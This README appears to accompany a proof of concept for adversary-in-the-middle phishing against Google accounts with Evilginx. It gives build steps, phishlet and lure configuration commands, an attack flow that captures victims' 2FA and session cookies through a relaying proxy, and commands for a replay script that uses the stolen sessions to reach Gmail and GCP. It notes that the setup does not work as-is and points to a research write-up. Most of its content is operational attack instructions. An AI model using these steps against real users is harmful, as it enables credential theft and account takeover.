# AiTM with Evilginx (community edition)

Adversary-in-the-Middle phishing: the proxy relays real Google, captures 2FA and session cookies on the fly.

Does not work as-is. This is a PoC to investigate further, or switch to Evilginx Pro. See the article https://hideandsec.sh/books/research/page/bypassing_botguard_and_dbsc_technical_study/ for details.

## Prerequisites

- A VPS (or exposed VM) with public IP, ports 53/80/443 open
- A dedicated domain name (e.g. `gws-lab.example.com`) with a wildcard DNS record `*.gws-lab.example.com -> VPS IP` (Let's Encrypt needs to resolve each subdomain: accounts., apis., mail., www., console.)
- Attacker machine: `pip3 install playwright requests` + `playwright install chrome`

## Evilginx installation

```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && go build
cp ../google.yaml ./phishlets
sudo ./evilginx2 -p ./phishlets
```

## Configuration

```
config domain gws-lab.example.com
config ipv4 external <VPS_PUBLIC_IP>
phishlets hostname google gws-lab.example.com
phishlets enable google
lures create google
lures get-url 0
lures edit 0 redirect_url https://mail.google.com

sessions               # monitor in real time
```

## Attack flow

1. The victim opens the lure URL: they see real Google (relayed), authenticates, validates 2FA -- everything is captured by the proxy.
2. They are redirected to mail.google.com: nothing unusual.
3. Attacker side: `sessions` shows the session with auth_tokens (Google cookies).
   DBSC note: the registration ceremony happened in the VICTIM's browser via the proxy -- the session cookie remains reusable (see main README).

## Replay

```bash
python3 replay_evilginx.py --sessions-dir <evilginx_sessions_directory> --mode both
# api     : extraction via internal Google endpoints (ListAccounts, myaccount)
#           + DOM extraction from GCP console (screenshot)
# browser : open Gmail + GCP Console in Chrome, screenshots

# Force system Chrome (if Chromium bundle crashes):
python3 replay_evilginx.py --mode browser --browser chrome
```
